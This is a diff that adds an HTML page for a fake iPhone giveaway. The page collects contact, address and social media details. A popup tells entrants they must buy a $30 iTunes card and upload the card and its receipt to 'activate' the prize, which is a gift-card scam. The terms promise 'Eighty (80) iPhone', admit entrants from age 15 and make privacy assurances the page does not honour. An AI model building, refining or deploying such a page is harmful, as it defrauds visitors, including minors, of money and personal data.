@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>iPhone Giveaway - Enter to Win!</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+     <link rel="stylesheet" href="win.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 Win a Brand New iPhone!</h1>
+            <p>"If this link is sent to you, your iphone opportunity just got REAL."</p>
+        </div>
+
+        <div id="notePopup" class="note-popup">
+  <div class="note-content">
+    <span id="closeNote" class="close-btn">×</span>
+    <h2>Welcome! <span class="celebrate" aria-hidden="true">🍏🎉</span></h2>
+    <p>Please fill the form carefully to enter the giveaway.</p>
+    <ul>
+        <li>"Note: You need $30 iTunes card to activate your iPhone, without attaching the card to the gallery provide in the form, you would not be able to get the iPhone. When attaching the card, add the receipt. You can buy the card online at www. Amazon.com"</li>
+    </ul>
+  </div>
+</div>
+
+<form id="giveawayForm">
+
+    <!-- FULL NAME -->
+    <div class="form-group">
+        <label for="fullName">Full Name <span class="required">*</span></label>
+        <input type="text" id="fullName" name="fullName" required>
+        <div class="error" id="nameError">Please enter your full name</div>
+    </div>
+
+    <!-- EMAIL -->
+    <div class="form-group">
+      <label for="email">Email Address <span class="required">*</span></label>
+        <input type="email" id="email" name="email" required>
+        <div class="error" id="emailError">Please enter a valid email address</div>
+    </div>
+
+    <!-- PHONE NUMBER -->
+    <div class="form-group">
+        <label for="phoneNumber">Phone Number <span class="required">*</span></label>
+
+        <div class="phone-group">
+            <div class="country-code">
+                <label for="countryCode" class="visually-hidden">Country Code</label>
+                <select id="countryCode" name="countryCode" required>
+                    <option value="">Select Code</option>
+                    <!-- (Your full country list stays unchanged) -->
+                      <option value="+93">🇦🇫 Afghanistan +93</option>
+                            <option value="+355">🇦🇱 Albania +355</option>
+                            <option value="+213">🇩🇿 Algeria +213</option>
+                            <option value="+1">🇺🇸 USA +1</option>
+                            <option value="+376">🇦🇩 Andorra +376</option>
+                            <option value="+244">🇦🇴 Angola +244</option>
+                            <option value="+54">🇦🇷 Argentina +54</option>
+                            <option value="+374">🇦🇲 Armenia +374</option>
+                            <option value="+61">🇦🇺 Australia +61</option>
+                            <option value="+43">🇦🇹 Austria +43</option>
+                            <option value="+994">🇦🇿 Azerbaijan +994</option>
+                            <option value="+973">🇧🇭 Bahrain +973</option>
+                            <option value="+880">🇧🇩 Bangladesh +880</option>
+                            <option value="+375">🇧🇾 Belarus +375</option>
+                            <option value="+32">🇧🇪 Belgium +32</option>
+                            <option value="+501">🇧🇿 Belize +501</option>
+                            <option value="+229">🇧🇯 Benin +229</option>
+                            <option value="+975">🇧🇹 Bhutan +975</option>
+                            <option value="+591">🇧🇴 Bolivia +591</option>
+                            <option value="+387">🇧🇦 Bosnia +387</option>
+                            <option value="+267">🇧🇼 Botswana +267</option>
+                            <option value="+55">🇧🇷 Brazil +55</option>
+                            <option value="+673">🇧🇳 Brunei +673</option>
+                            <option value="+359">🇧🇬 Bulgaria +359</option>
+                            <option value="+226">🇧🇫 Burkina Faso +226</option>
+                            <option value="+257">🇧🇮 Burundi +257</option>
+                            <option value="+855">🇰🇭 Cambodia +855</option>
+                            <option value="+237">🇨🇲 Cameroon +237</option>
+                            <option value="+1">🇨🇦 Canada +1</option>
+                            <option value="+238">🇨🇻 Cape Verde +238</option>
+                            <option value="+236">🇨🇫 Central African Republic +236</option>
+                            <option value="+235">🇹🇩 Chad +235</option>
+                            <option value="+56">🇨🇱 Chile +56</option>
+                            <option value="+86">🇨🇳 China +86</option>
+                            <option value="+57">🇨🇴 Colombia +57</option>
+                            <option value="+269">🇰🇲 Comoros +269</option>
+                            <option value="+242">🇨🇬 Congo +242</option>
+                            <option value="+506">🇨🇷 Costa Rica +506</option>
+                            <option value="+385">🇭🇷 Croatia +385</option>
+                            <option value="+53">🇨🇺 Cuba +53</option>
+                            <option value="+357">🇨🇾 Cyprus +357</option>
+                            <option value="+420">🇨🇿 Czech Republic +420</option>
+                            <option value="+45">🇩🇰 Denmark +45</option>
+                            <option value="+253">🇩🇯 Djibouti +253</option>
+                            <option value="+593">🇪🇨 Ecuador +593</option>
+                            <option value="+20">🇪🇬 Egypt +20</option>
+                            <option value="+503">🇸🇻 El Salvador +503</option>
+                            <option value="+240">🇬🇶 Equatorial Guinea +240</option>
+                            <option value="+291">🇪🇷 Eritrea +291</option>
+                            <option value="+372">🇪🇪 Estonia +372</option>
+                            <option value="+251">🇪🇹 Ethiopia +251</option>
+                            <option value="+679">🇫🇯 Fiji +679</option>
+                            <option value="+358">🇫🇮 Finland +358</option>
+                            <option value="+33">🇫🇷 France +33</option>
+                            <option value="+241">🇬🇦 Gabon +241</option>
+                            <option value="+220">🇬🇲 Gambia +220</option>
+                            <option value="+995">🇬🇪 Georgia +995</option>
+                            <option value="+49">🇩🇪 Germany +49</option>
+                            <option value="+233">🇬🇭 Ghana +233</option>
+                            <option value="+30">🇬🇷 Greece +30</option>
+                            <option value="+502">🇬🇹 Guatemala +502</option>
+                            <option value="+224">🇬🇳 Guinea +224</option>
+                            <option value="+245">🇬🇼 Guinea-Bissau +245</option>
+                            <option value="+592">🇬🇾 Guyana +592</option>
+                            <option value="+509">🇭🇹 Haiti +509</option>
+                            <option value="+504">🇭🇳 Honduras +504</option>
+                            <option value="+852">🇭🇰 Hong Kong +852</option>
+                            <option value="+36">🇭🇺 Hungary +36</option>
+                            <option value="+354">🇮🇸 Iceland +354</option>
+                            <option value="+91">🇮🇳 India +91</option>
+                            <option value="+62">🇮🇩 Indonesia +62</option>
+                            <option value="+98">🇮🇷 Iran +98</option>
+                            <option value="+964">🇮🇶 Iraq +964</option>
+                            <option value="+353">🇮🇪 Ireland +353</option>
+                            <option value="+972">🇮🇱 Israel +972</option>
+                            <option value="+39">🇮🇹 Italy +39</option>
+                            <option value="+225">🇨🇮 Ivory Coast +225</option>
+                            <option value="+81">🇯🇵 Japan +81</option>
+                            <option value="+962">🇯🇴 Jordan +962</option>
+                            <option value="+7">🇰🇿 Kazakhstan +7</option>
+                            <option value="+254">🇰🇪 Kenya +254</option>
+                            <option value="+965">🇰🇼 Kuwait +965</option>
+                            <option value="+996">🇰🇬 Kyrgyzstan +996</option>
+                            <option value="+856">🇱🇦 Laos +856</option>
+                            <option value="+371">🇱🇻 Latvia +371</option>
+                            <option value="+961">🇱🇧 Lebanon +961</option>
+                            <option value="+266">🇱🇸 Lesotho +266</option>
+                            <option value="+231">🇱🇷 Liberia +231</option>
+                            <option value="+218">🇱🇾 Libya +218</option>
+                            <option value="+370">🇱🇹 Lithuania +370</option>
+                            <option value="+352">🇱🇺 Luxembourg +352</option>
+                            <option value="+261">🇲🇬 Madagascar +261</option>
+                            <option value="+265">🇲🇼 Malawi +265</option>
+                            <option value="+60">🇲🇾 Malaysia +60</option>
+                            <option value="+960">🇲🇻 Maldives +960</option>
+                            <option value="+223">🇲🇱 Mali +223</option>
+                            <option value="+356">🇲🇹 Malta +356</option>
+                            <option value="+222">🇲🇷 Mauritania +222</option>
+                            <option value="+230">🇲🇺 Mauritius +230</option>
+                            <option value="+52">🇲🇽 Mexico +52</option>
+                            <option value="+373">🇲🇩 Moldova +373</option>
+                            <option value="+377">🇲🇨 Monaco +377</option>
+                            <option value="+976">🇲🇳 Mongolia +976</option>
+                            <option value="+382">🇲🇪 Montenegro +382</option>
+                            <option value="+212">🇲🇦 Morocco +212</option>
+                            <option value="+258">🇲🇿 Mozambique +258</option>
+                            <option value="+95">🇲🇲 Myanmar +95</option>
+                            <option value="+264">🇳🇦 Namibia +264</option>
+                            <option value="+977">🇳🇵 Nepal +977</option>
+                            <option value="+31">🇳🇱 Netherlands +31</option>
+                            <option value="+64">🇳🇿 New Zealand +64</option>
+                            <option value="+505">🇳🇮 Nicaragua +505</option>
+                            <option value="+227">🇳🇪 Niger +227</option>
+                            <option value="+234">🇳🇬 Nigeria +234</option>
+                            <option value="+850">🇰🇵 North Korea +850</option>
+                            <option value="+389">🇲🇰 North Macedonia +389</option>
+                            <option value="+47">🇳🇴 Norway +47</option>
+                            <option value="+968">🇴🇲 Oman +968</option>
+                            <option value="+92">🇵🇰 Pakistan +92</option>
+                            <option value="+970">🇵🇸 Palestine +970</option>
+                            <option value="+507">🇵🇦 Panama +507</option>
+                            <option value="+675">🇵🇬 Papua New Guinea +675</option>
+                            <option value="+595">🇵🇾 Paraguay +595</option>
+                            <option value="+51">🇵🇪 Peru +51</option>
+                            <option value="+63">🇵🇭 Philippines +63</option>
+                            <option value="+48">🇵🇱 Poland +48</option>
+                            <option value="+351">🇵🇹 Portugal +351</option>
+                            <option value="+974">🇶🇦 Qatar +974</option>
+                            <option value="+40">🇷🇴 Romania +40</option>
+                            <option value="+7">🇷🇺 Russia +7</option>
+                            <option value="+250">🇷🇼 Rwanda +250</option>
+                            <option value="+966">🇸🇦 Saudi Arabia +966</option>
+                            <option value="+221">🇸🇳 Senegal +221</option>
+                            <option value="+381">🇷🇸 Serbia +381</option>
+                            <option value="+65">🇸🇬 Singapore +65</option>
+                            <option value="+421">🇸🇰 Slovakia +421</option>
+                            <option value="+386">🇸🇮 Slovenia +386</option>
+                            <option value="+252">🇸🇴 Somalia +252</option>
+                            <option value="+27">🇿🇦 South Africa +27</option>
+                            <option value="+82">🇰🇷 South Korea +82</option>
+                            <option value="+211">🇸🇸 South Sudan +211</option>
+                            <option value="+34">🇪🇸 Spain +34</option>
+                            <option value="+94">🇱🇰 Sri Lanka +94</option>
+                            <option value="+249">🇸🇩 Sudan +249</option>
+                            <option value="+597">🇸🇷 Suriname +597</option>
+                            <option value="+46">🇸🇪 Sweden +46</option>
+                            <option value="+41">🇨🇭 Switzerland +41</option>
+                            <option value="+963">🇸🇾 Syria +963</option>
+                            <option value="+886">🇹🇼 Taiwan +886</option>
+                            <option value="+992">🇹🇯 Tajikistan +992</option>
+                            <option value="+255">🇹🇿 Tanzania +255</option>
+                            <option value="+66">🇹🇭 Thailand +66</option>
+                            <option value="+228">🇹🇬 Togo +228</option>
+                            <option value="+216">🇹🇳 Tunisia +216</option>
+                            <option value="+90">🇹🇷 Turkey +90</option>
+                            <option value="+993">🇹🇲 Turkmenistan +993</option>
+                            <option value="+256">🇺🇬 Uganda +256</option>
+                            <option value="+380">🇺🇦 Ukraine +380</option>
+                            <option value="+971">🇦🇪 UAE +971</option>
+                            <option value="+44">🇬🇧 UK +44</option>
+                            <option value="+598">🇺🇾 Uruguay +598</option>
+                            <option value="+998">🇺🇿 Uzbekistan +998</option>
+                            <option value="+58">🇻🇪 Venezuela +58</option>
+                            <option value="+84">🇻🇳 Vietnam +84</option>
+                            <option value="+967">🇾🇪 Yemen +967</option>
+                            <option value="+260">🇿🇲 Zambia +260</option>
+                            <option value="+263">🇿🇼 Zimbabwe +263</option>
+                </select>
+            </div>
+
+            <div class="phone-number">
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="123-456-7890" required>
+            </div>
+        </div>
+
+        <div class="error" id="phoneError">Please enter a valid phone number</div>
+    </div>
+
+    <!-- SOCIAL MEDIA PLATFORM -->
+    <div class="form-group">
+        <label for="socialPlatform">Choose Your Social Media</label>
+        <select id="socialPlatform" name="socialPlatform">
+            <option value="">-- Select One --</option>
+            <option value="Instagram">Instagram</option>
+            <option value="TikTok">TikTok</option>
+            <option value="Twitter/X">Twitter / X</option>
+            <option value="Facebook">Facebook</option>
+            <option value="Snapchat">Snapchat</option>
+            <option value="Other">Other</option>
+        </select>
+        <p id="socialPlatformError" class="error">Please select a social platform</p>
+
+    
+
+    </div>
+
+    <!-- SOCIAL USERNAME (CONDITIONAL) -->
+    <div class="form-group" id="socialUsernameSection" style="display:none;">
+        <label for="socialUsername">Enter Your Username</label>
+        <input type="text" id="socialUsername" name="socialUsername" placeholder="@username">
+        <p id="socialUsernameError" class="error">Please enter your username</p>
+    </div>
+
+    <!-- IPHONE MODEL -->
+    <div class="form-group">
+        <label for="iphoneModel">Select iPhone Model <span class="required">*</span></label>
+        <select id="iphoneModel" name="iphoneModel" required>
+            <option value="">Choose your iPhone</option>
+            <option value="iPhone 17 Pro Max">iPhone 17 Pro Max</option>
+            <option value="iPhone 17 Pro">iPhone 17 Pro</option>
+            <option value="iPhone 16 Pro Max">iPhone 16 Pro Max</option>
+            <option value="iPhone 16 Pro">iPhone 16 Pro</option>
+            <option value="iPhone 16 Plus">iPhone 16 Plus</option>
+            <option value="iPhone 16">iPhone 16</option>
+            <option value="iPhone 15 Pro Max">iPhone 15 Pro Max</option>
+            <option value="iPhone 15 Pro">iPhone 15 Pro</option>
+            <option value="iPhone 15 Plus">iPhone 15 Plus</option>
+            <option value="iPhone 15">iPhone 15</option>
+            <option value="iPhone 14 Pro Max">iPhone 14 Pro Max</option>
+            <option value="iPhone 14 Pro">iPhone 14 Pro</option>
+            <option value="iPhone 14 Plus">iPhone 14 Plus</option>
+            <option value="iPhone 14">iPhone 14</option>
+            <option value="iPhone 13 Pro Max">iPhone 13 Pro Max</option>
+            <option value="iPhone 13 Pro">iPhone 13 Pro</option>
+            <option value="iPhone 13">iPhone 13</option>
+            <option value="iPhone 13 mini">iPhone 13 mini</option>
+            <option value="iPhone SE (3rd generation)">iPhone SE (3rd generation)</option>
+        </select>
+        <div class="error" id="modelError">Please select an iPhone model</div>
+    </div>
+
+    <!-- IPHONE SPECS -->
+    <div class="iphone-specs">
+
+        <div class="spec-row">
+            <div class="form-group">
+                <label for="iphoneColor">Color <span class="required">*</span></label>
+                <select id="iphoneColor" name="iphoneColor" required>
+                    <option value="">Select Color</option>
+                    <!-- color list unchanged -->
+                       <option value="Natural Titanium">Natural Titanium</option>
+                            <option value="Blue Titanium">Blue Titanium</option>
+                            <option value="White Titanium">White Titanium</option>
+                            <option value="Black Titanium">Black Titanium</option>
+                            <option value="Desert Titanium">Desert Titanium</option>
+                            <option value="Black">Black</option>
+                            <option value="White">White</option>
+                            <option value="Pink">Pink</option>
+                            <option value="Yellow">Yellow</option>
+                            <option value="Green">Green</option>
+                            <option value="Blue">Blue</option>
+                            <option value="Purple">Purple</option>
+                            <option value="Red">Red (PRODUCT RED)</option>
+                            <option value="Gold">Gold</option>
+                            <option value="Silver">Silver</option>
+                            <option value="Space Gray">Space Gray</option>
+                            <option value="Space Black">Space Black</option>
+                            <option value="Deep Purple">Deep Purple</option>
+                            <option value="Midnight">Midnight</option>
+                            <option value="Starlight">Starlight</option>
+                        </select>
+
+                </select>
+                <div class="error" id="colorError">Please select a color</div>
+            </div>
+
+            <div class="form-group">
+                <label for="iphoneStorage">Storage <span class="required">*</span></label>
+                <select id="iphoneStorage" name="iphoneStorage" required>
+                    <option value="">Select Storage</option>
+                    <option value="64GB">64GB</option>
+                    <option value="128GB">128GB</option>
+                    <option value="256GB">256GB</option>
+                    <option value="512GB">512GB</option>
+                    <option value="1TB">1TB</option>
+                </select>
+                <div class="error" id="storageError">Please select storage</div>
+            </div>
+        </div>
+
+        <div class="spec-row">
+            <div class="form-group">
+                <label for="iphoneRam">RAM <span class="required">*</span></label>
+                <select id="iphoneRam" name="iphoneRam" required>
+                    <option value="">Select RAM</option>
+                    <option value="4GB">4GB</option>
+                    <option value="6GB">6GB</option>
+                    <option value="8GB">8GB</option>
+                </select>
+                <div class="error" id="ramError">Please select RAM</div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- SHIPPING ADDRESS -->
+    <div class="form-group">
+        <label for="street">Shipping Address (Optional)</label>
+
+        <div class="address-group">
+            <input type="text" id="street" name="street" placeholder="Street Address">
+
+            <div class="address-row">
+                <input type="text" id="city" name="city" placeholder="City">
+                <input type="text" id="state" name="state" placeholder="State/Province">
+            </div>
+
+            <div class="address-row">
+                <input type="text" id="zip" name="zip" placeholder="ZIP/Postal Code">
+                <input type="text" id="country" name="country" placeholder="Country">
+            </div>
+        </div>
+    </div>
+
+    <!-- REFERRAL SOURCE -->
+    <div class="form-group">
+        <label for="referralSource">How did you hear about us? (Optional)</label>
+        <select id="referralSource" name="referralSource">
+            <option value="">Select an option</option>
+            <option value="social">Social Media</option>
+            <option value="friend">Friend or Family</option>
+            <option value="search">Search Engine</option>
+            <option value="ad">Advertisement</option>
+            <option value="blog">Blog/Article</option>
+            <option value="other">Other</option>
+        </select>
+    </div>
+
+    <!-- IMAGE UPLOAD -->
+    <div class="form-group">
+        <label for="imageInput">Upload Images (Optional – Max 3 images)</label>
+
+        <div class="image-upload" id="imageUploadArea">
+            <input type="file" id="imageInput" accept="image/*" multiple>
+            <p style="color:#666; margin-bottom:10px;">📸 Click to select images</p>
+            <p style="color:#999; font-size:13px;">You can upload up to 3 images from your gallery</p>
+        </div>
+
+        <div class="image-preview" id="imagePreview"></div>
+        <div class="error" id="imageError">Maximum 3 images allowed</div>
+    </div>
+
+    <!-- CHECKBOXES -->
+    <div class="checkbox-group">
+
+        <div class="checkbox-item">
+            <input type="checkbox" id="terms" name="terms" required>
+            <label for="terms"> I agree to the <a href="#" id="termsLink">terms and conditions</a> <span class="required">*</span></label>
+        </div>
+        <div class="error" id="termsError">You must agree to the terms and conditions</div>
+
+        <div class="checkbox-item">
+            <input type="checkbox" id="newsletter" name="newsletter" checked>
+            <label for="newsletter"> Subscribe to our newsletter for updates and future giveaways</label>
+        </div>
+
+    </div>
+
+    <!-- SUBMIT BUTTON -->
+    <button type="submit" class="submit-btn" id="submitBtn">Enter Giveaway</button>
+
+</form>
+
+
+            
+          <!-- Footer -->
+    <footer style="text-align:center; padding:10px 0; font-size:14px; color:#666;">
+      © 2025 Bigwyte. Powered by community support 🍏❤️
+
+      <p class="instagram">
+        <a href="https://instagram.com/BIG.NINETYNINE" target="_blank">
+            Follow us on Instagram
+        </a>
+    </p>
+    </footer>
+    
+
+
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <div class="success-icon">✓</div>
+            <h2>You're Entered!</h2>
+            <p>Thank you for entering our iPhone giveaway! We've received your entry and will contact you via email if you're selected as the winner.</p>
+            <p style="margin-top:15px; font-size:14px;">Good luck! 🍀</p>
+        </div>
+    </div>
+
+     
+    <!-- Terms and Conditions Modal -->
+    <div class="modal" id="termsModal">
+        <div class="modal-content">
+            <div class="modal-header"><h2>Terms and Conditions</h2></div>
+            <div class="modal-body">
+                <p><strong>iPhone Giveaway - Official Rules</strong></p>
+
+                <h3>1. Eligibility</h3>
+                <ul>
+                    <li>Must be 15 years or older to enter</li>
+                    <li>Open to residents worldwide</li>
+                    <li>Employees and their immediate family members are not eligible</li>
+                </ul>
+
+                <h3>2. Entry Period</h3>
+                <ul>
+                    <li>Giveaway runs from the start date until the announced end date</li>
+                    <li>All entries must be received before the deadline</li>
+                </ul>
+
+                <h3>3. Prize</h3>
+                <ul>
+                    <li>Eighty (80) iPhone as selected by the winner's</li>
+                    <li>Prize will be shipped to the address provided</li>
+                    <li>No cash alternative or prize substitution</li>
+                </ul>
+
+                <h3>4. Winner Selection</h3>
+                <ul>
+                    <li>Winner will be selected randomly from all eligible entries</li>
+                    <li>Winner will be notified via email within 7 days</li>
+                    <li>Winner must respond within 72 hours to claim prize</li>
+                </ul>
+
+                <h3>5. Privacy</h3>
+                <ul>
+                    <li>Your information will only be used for giveaway purposes</li>
+                    <li>We will not share your data with third parties</li>
+                    <li>Optional newsletter subscription can be unsubscribed at any time</li>
+                </ul>
+
+                <h3>6. General Conditions</h3>
+                <ul>
+                    <li>By entering, you agree to these terms and conditions</li>
+                    <li>We reserve the right to verify eligibility of entries</li>
+                    <li>Fraudulent entries will be disqualified</li>
+                    <li>Our decision is final in all matters</li>
+                </ul>
+
+                <p style="margin-top:15px; font-size:13px; color:#999;">Last Updated: November 2025</p>
+            </div>
+
+            <div class="modal-footer">
+                <button class="modal-btn modal-btn-secondary" id="closeModal">Close</button>
+                <button class="modal-btn modal-btn-primary" id="agreeTerms">I Agree</button>
+            </div>
+
+        </div>
+
+        </div> <!-- end of container -->
+
+          
+    </div>
+      
+    
+</body>
+<script src="win.js"></script>
+</html>
